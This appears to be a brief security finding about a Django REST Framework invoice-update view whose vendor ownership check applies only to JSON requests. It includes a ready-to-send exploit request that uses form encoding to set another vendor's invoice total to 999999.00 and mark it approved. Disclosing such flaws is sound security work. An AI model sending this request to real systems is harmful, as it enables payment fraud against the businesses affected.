diagnosis: VendorInvoiceDetailUpdateView restricts update operations only when request.content_type is 'application/json'. When accessed through the Browsable API form interface, requests are submitted with 'application/x-www-form-urlencoded' or 'multipart/form-data', completely bypassing the vendor ownership check and allowing attackers to alter payment amounts and approval states on competitor invoices.
exploit_request:
PUT /api/invoices/992/ HTTP/1.1
Host: billing.supplychain.net
Authorization: Token rogue_vendor_token
Content-Type: application/x-www-form-urlencoded

invoice_number=INV-992&total_payable=999999.00&approval_status=APPROVED
